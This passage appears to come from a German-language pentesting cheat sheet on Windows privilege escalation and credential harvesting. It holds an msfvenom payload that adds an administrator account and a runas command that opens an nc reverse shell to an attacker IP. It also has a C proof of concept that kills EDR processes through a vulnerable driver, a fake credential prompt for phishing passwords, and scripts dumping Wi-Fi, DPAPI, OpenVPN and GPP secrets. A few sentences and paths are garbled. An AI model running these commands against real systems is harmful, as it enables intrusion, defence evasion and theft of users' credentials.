Wenn der Pfad zu einer ausführbaren Datei nicht in Anführungszeichen steht, versucht Windows, jede Teilfolge vor einem Leerzeichen auszuführen.

For example, for the path _C:\Program Files\Some Folder\Service.exe_ Windows will try to execute:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Liste alle nicht in Anführungszeichen gesetzten Service-Pfade auf, ausgenommen diejenigen, die zu integrierten Windows-Diensten gehören:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Sie können diese Schwachstelle mit metasploit erkennen und ausnutzen:** `exploit/windows/local/trusted\_service\_path` Sie können manuell eine Service-Binärdatei mit metasploit erstellen:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Wiederherstellungsaktionen

Windows ermöglicht es Benutzern, Aktionen festzulegen, die ausgeführt werden, wenn ein Dienst fehlschlägt. Diese Funktion kann so konfiguriert werden, dass sie auf ein binary zeigt. Wenn dieses binary ersetzbar ist, könnte privilege escalation möglich sein. Weitere Details finden Sie in der [offiziellen Dokumentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Anwendungen

### Installierte Anwendungen

Prüfen Sie die **Berechtigungen der binaries** (vielleicht können Sie eine davon überschreiben und damit privilege escalation ermöglichen) und der **Ordner** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Schreibberechtigungen

Prüfe, ob du eine config file ändern kannst, um eine spezielle Datei zu lesen, oder ob du ein binary ändern kannst, das vom Administrator-Konto ausgeführt wird (schedtasks).

Eine Möglichkeit, schwache Ordner-/Dateiberechtigungen im System zu finden, ist:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ Plugin-Autoload Persistenz/Ausführung

Notepad++ lädt jede Plugin-DLL in seinen `plugins`-Unterordnern automatisch. Wenn eine beschreibbare portable/copy-Installation vorhanden ist, führt das Ablegen eines bösartigen Plugins zu automatischer Codeausführung innerhalb von `notepad++.exe` bei jedem Start (einschließlich aus `DllMain` und plugin callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Beim Start ausführen

**Prüfe, ob du eine Registry- oder Binärdatei überschreiben kannst, die von einem anderen Benutzer ausgeführt wird.**\
**Lies** die **folgende Seite**, um mehr über interessante **Autoruns-Standorte zur Eskalation von Privilegien** zu erfahren:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Treiber

Suche nach möglichen **Drittanbieter-, merkwürdigen oder verwundbaren** Treibern
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Wenn ein Treiber eine arbitrary kernel read/write primitive (häufig in schlecht gestalteten IOCTL-Handlern) exponiert, kann man eskalieren, indem man ein SYSTEM token direkt aus dem kernel memory stiehlt. Siehe die Schritt‑für‑Schritt‑Technik hier:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Bei Race-Condition-Bugs, bei denen der verwundbare Aufruf einen vom Angreifer kontrollierten Object Manager-Pfad öffnet, kann das gezielte Verlangsamen der Lookup-Operation (durch Verwendung von Komponenten mit maximaler Länge oder tiefen Verzeichnisketten) das Zeitfenster von Mikrosekunden auf einige zehn Mikrosekunden ausdehnen:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Moderne hive vulnerabilities erlauben es, deterministische Layouts vorzubereiten, beschreibbare HKLM/HKU-Nachfolger zu missbrauchen und metadata corruption in kernel paged-pool overflows umzuwandeln, ganz ohne custom driver. Die komplette Kette hier:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Ausnutzen von fehlendem FILE_DEVICE_SECURE_OPEN bei Device-Objekten (LPE + EDR kill)

Einige signierte Third‑Party-Treiber erstellen ihr Device-Objekt mit einer restriktiven SDDL via IoCreateDeviceSecure, vergessen jedoch, FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics zu setzen. Ohne dieses Flag wird die sichere DACL nicht durchgesetzt, wenn das Device über einen Pfad mit einer zusätzlichen Komponente geöffnet wird, wodurch jeder unprivilegierte Benutzer einen Handle erhalten kann, indem er einen Namespace-Pfad wie verwendet:

- \\.\DeviceName\anything
- \\.\amsdk\anyfile (aus einem realen Fall)

Sobald ein Benutzer das Device öffnen kann, können privilegierte IOCTLs des Treibers für LPE und Manipulationen missbraucht werden. Beispielhafte Fähigkeiten, die in der Praxis beobachtet wurden:
- Handles mit vollem Zugriff für beliebige Prozesse zurückgeben (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Uneingeschränkter raw disk read/write (offline tampering, boot-time persistence tricks).
- Beliebige Prozesse terminieren, einschließlich Protected Process/Light (PP/PPL), wodurch AV/EDR kills aus dem Userland via Kernel möglich werden.

Minimaler PoC-Muster (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Gegenmaßnahmen für Entwickler
- Setze immer FILE_DEVICE_SECURE_OPEN, wenn device objects erstellt werden sollen, die durch eine DACL eingeschränkt werden.
- Validieren Sie den Aufruferkontext für privilegierte Operationen. Fügen Sie PP/PPL-Checks hinzu, bevor Sie Prozessbeendigung oder das Zurückgeben von Handles erlauben.
- Beschränken Sie IOCTLs (access masks, METHOD_*, input validation) und erwägen Sie brokered models statt direkter Kernel-Privilegien.

Erkennungsansätze für Verteidiger
- Überwachen Sie user-mode-Öffnungen verdächtiger Device-Namen (z. B. \\ .\\amsdk*) und spezifische IOCTL-Sequenzen, die auf Missbrauch hindeuten.
- Setzen Sie Microsofts vulnerable driver blocklist (HVCI/WDAC/Smart App Control) durch und pflegen Sie eigene allow/deny lists.

## PATH DLL Hijacking

Wenn Sie **Schreibberechtigungen in einem Ordner haben, der im PATH enthalten ist** könnten Sie eine DLL, die von einem Prozess geladen wird, hijacken und **escalate privileges**.

Prüfen Sie die Berechtigungen aller Ordner im PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Weitere Informationen darüber, wie man diese Überprüfung missbraucht:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Überprüfe, ob andere bekannte Computer in der hosts file fest eingetragen sind
```
type C:\Windows\System32\drivers\etc\hosts
```
### Netzwerkschnittstellen & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

Prüfe von außen auf **eingeschränkte Dienste**
```bash
netstat -ano #Opened ports?
```
### Routing-Tabelle
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Tabelle
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall-Regeln

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(Regeln auflisten, Regeln erstellen, deaktivieren, deaktivieren...)**

Mehr [ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Die Binärdatei `bash.exe` befindet sich auch unter `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Wenn du root user bekommst, kannst du auf jedem Port lauschen (das erste Mal, wenn du `nc.exe` verwendest, um auf einem Port zu lauschen, fragt per GUI, ob `nc` von der firewall zugelassen werden soll).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Um bash einfach als root zu starten, kannst du `--default-user root` verwenden

Du kannst das `WSL`-Dateisystem im Ordner `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` erkunden

## Windows-Anmeldeinformationen

### Winlogon-Anmeldeinformationen
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Der Windows Vault speichert Benutzercredentials für Server, Websites und andere Programme, bei denen **Windows** die Benutzer **automatisch anmelden kann**. 

Auf den ersten Blick könnte es so aussehen, als könnten Benutzer ihre Facebook credentials, Twitter credentials, Gmail credentials etc. speichern, damit sie sich automatisch über Browser anmelden. Das ist jedoch nicht der Fall.

Der Windows Vault speichert credentials, mit denen **Windows** Benutzer automatisch anmelden kann, was bedeutet, dass jede **Windows-Anwendung, die credentials benötigt, um auf eine Ressource zuzugreifen** (Server oder Website), **diesen Credential Manager nutzen kann** & Windows Vault und die bereitgestellten credentials verwenden kann, anstatt dass Benutzer ständig Benutzername und Passwort eingeben müssen.

Sofern die Anwendungen nicht mit dem Credential Manager interagieren, halte ich es für unwahrscheinlich, dass sie die credentials für eine bestimmte Ressource verwenden können. Wenn Ihre Anwendung also den Vault nutzen möchte, sollte sie irgendwie mit dem Credential Manager kommunizieren und die credentials für diese Ressource aus dem standardmäßigen Storage-Vault anfordern.

Use the `cmdkey` to list the stored credentials on the machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Anschließend können Sie `runas` mit der Option `/savecred` verwenden, um die gespeicherten Anmeldeinformationen zu nutzen. Das folgende Beispiel ruft ein Remote-Binary über ein SMB-Share auf.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Verwendung von `runas` mit einem bereitgestellten Satz von Anmeldeinformationen.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Beachte, dass mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), oder das [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

Die Data Protection API (DPAPI) bietet eine Methode zur symmetrischen Verschlüsselung von Daten, die vorwiegend innerhalb des Windows-Betriebssystems für die symmetrische Verschlüsselung asymmetrischer privater Schlüssel verwendet wird. Diese Verschlüsselung nutzt ein Benutzer- oder Systemgeheimnis, das maßgeblich zur Entropie beiträgt.

**DPAPI ermöglicht die Verschlüsselung von Schlüsseln mittels eines symmetrischen Schlüssels, der aus den Anmeldegeheimnissen des Benutzers abgeleitet wird**. In Szenarien mit Systemverschlüsselung verwendet es die Domänen-Authentifizierungsgeheimnisse des Systems.

Verschlüsselte Benutzer-RSA-Schlüssel, die mit DPAPI gesichert sind, werden im Verzeichnis %APPDATA%\Microsoft\Protect\{SID} gespeichert, wobei {SID} den Benutzer-[Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) darstellt. **Der DPAPI-Schlüssel, zusammen mit dem Master-Schlüssel, der die privaten Schlüssel des Benutzers in derselben Datei schützt,** besteht typischerweise aus 64 Bytes Zufallsdaten. (Es ist wichtig zu beachten, dass der Zugriff auf dieses Verzeichnis eingeschränkt ist, sodass eine Auflistung seines Inhalts mit dem `dir`-Befehl in CMD nicht möglich ist, es aber über PowerShell aufgelistet werden kann).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Du kannst das **mimikatz module** `dpapi::masterkey` mit den passenden Argumenten (`/pvk` oder `/rpc`) verwenden, um es zu entschlüsseln.

Die **credentials files protected by the master password** befinden sich üblicherweise in:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Du kannst das **mimikatz module** `dpapi::cred` mit dem passenden `/masterkey` zum Entschlüsseln verwenden.\
Du kannst viele **DPAPI** **Masterkeys** aus dem **Speicher** mit dem `sekurlsa::dpapi` module extrahieren (wenn du root bist).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell-Anmeldeinformationen

**PowerShell-Anmeldeinformationen** werden häufig für Scripting- und Automatisierungsaufgaben verwendet, um verschlüsselte Zugangsdaten bequem zu speichern. Die Anmeldeinformationen werden mit **DPAPI** geschützt, was in der Regel bedeutet, dass sie nur vom selben Benutzer auf demselben Computer entschlüsselt werden können, auf dem sie erstellt wurden.

Um eine PowerShell-Anmeldeinformation aus der Datei, die sie enthält, zu **entschlüsseln**, kannst du Folgendes tun:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### WLAN
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Gespeicherte RDP-Verbindungen

Du findest sie unter `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
und in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Kürzlich ausgeführte Befehle
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote-Desktop-Anmeldeinformationsverwaltung**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Verwende das **Mimikatz** `dpapi::rdg` Modul mit dem entsprechenden `/masterkey`, um **beliebige .rdg-Dateien zu entschlüsseln**\
Du kannst **viele DPAPI masterkeys** aus dem Speicher mit dem Mimikatz `sekurlsa::dpapi` Modul extrahieren

### Sticky Notes

Viele Nutzer verwenden die StickyNotes app auf Windows-Arbeitsstationen, um **Passwörter zu speichern** und andere Informationen, ohne zu erkennen, dass es sich um eine Datenbankdatei handelt. Diese Datei befindet sich unter `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` und ist immer einen Blick wert.

### AppCmd.exe

**Beachte, dass zum Wiederherstellen von Passwörtern aus AppCmd.exe Administratorrechte erforderlich sind und das Programm unter einem hohen Integritätslevel ausgeführt werden muss.**\
**AppCmd.exe** befindet sich im Verzeichnis `%systemroot%\system32\inetsrv\`.\  
Wenn diese Datei vorhanden ist, ist es möglich, dass einige **credentials** konfiguriert wurden und **wiederhergestellt** werden können.

Dieser Code wurde aus [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) entnommen:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Prüfe, ob `C:\Windows\CCM\SCClient.exe` existiert .\
Installer werden **mit SYSTEM privileges ausgeführt**, viele sind anfällig für **DLL Sideloading (Info von** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Dateien und Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host-Schlüssel
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH-Schlüssel in der Registry

Private SSH-Schlüssel können im Registry-Schlüssel `HKCU\Software\OpenSSH\Agent\Keys` gespeichert sein, daher solltest du prüfen, ob sich dort etwas Interessantes befindet:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Wenn Sie einen Eintrag in diesem Pfad finden, handelt es sich wahrscheinlich um einen gespeicherten SSH key. Er wird verschlüsselt gespeichert, kann aber leicht mit [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) entschlüsselt werden.\
Weitere Informationen zu dieser Technik: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Wenn der `ssh-agent`-Dienst nicht läuft und Sie möchten, dass er beim Booten automatisch gestartet wird, führen Sie aus:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Es sieht so aus, als sei diese Technik nicht mehr gültig. Ich habe versucht, einige ssh keys zu erstellen, sie mit `ssh-add` hinzuzufügen und mich per ssh an einer Maschine anzumelden. Der Registry-Schlüssel HKCU\Software\OpenSSH\Agent\Keys existiert nicht und procmon hat während der asymmetrischen Schlüssel-Authentifizierung die Verwendung von `dpapi.dll` nicht festgestellt.
>
> ### Unbeaufsichtigte Dateien
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Sie können auch nach diesen Dateien suchen, indem Sie **metasploit** verwenden: _post/windows/gather/enum_unattend_

Beispielinhalt:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM Sicherungen
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud-Zugangsdaten
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Suche nach einer Datei namens **SiteList.xml**

### Cached GPP Passwort

Eine Funktion war früher verfügbar, die die Bereitstellung von benutzerdefinierten lokalen Administratorkonten auf einer Gruppe von Rechnern über Group Policy Preferences (GPP) ermöglichte. Diese Methode wies jedoch erhebliche Sicherheitsmängel auf. Zum einen konnten die Group Policy Objects (GPOs), die als XML-Dateien in SYSVOL gespeichert sind, von jedem Domänenbenutzer eingesehen werden. Zum anderen konnten die Passwörter innerhalb dieser GPPs, die mit AES256 unter Verwendung eines öffentlich dokumentierten Standard-Schlüssels verschlüsselt waren, von jedem authentifizierten Benutzer entschlüsselt werden. Dies stellte ein ernstes Risiko dar, da es Benutzern ermöglichen konnte, erhöhte Rechte zu erlangen.

Um dieses Risiko zu mindern, wurde eine Funktion entwickelt, die lokal zwischengespeicherte GPP-Dateien nach einem Nicht-leeren "cpassword"-Feld durchsucht. Beim Finden einer solchen Datei entschlüsselt die Funktion das Passwort und gibt ein benutzerdefiniertes PowerShell-Objekt zurück. Dieses Objekt enthält Informationen über die GPP und den Speicherort der Datei und unterstützt so bei der Identifizierung und Behebung dieser Sicherheitslücke.

Suche in `C:\ProgramData\Microsoft\Group Policy\history` oder in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (vor Windows Vista)_ nach diesen Dateien:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Um das cPassword zu entschlüsseln:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Verwendung von crackmapexec, um die Passwörter zu erhalten:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Beispiel einer web.config mit Anmeldedaten:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN-Zugangsdaten
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Nach credentials fragen

Du kannst jederzeit **den Benutzer bitten, seine credentials oder sogar die credentials eines anderen Benutzers einzugeben**, wenn du denkst, dass er sie kennen könnte (beachte, dass **das direkte Bitten** des Clients um die **credentials** wirklich **riskant** ist):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Mögliche Dateinamen mit credentials**

Bekannte Dateien, die vor einiger Zeit **passwords** in **clear-text** oder **Base64** enthielten
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
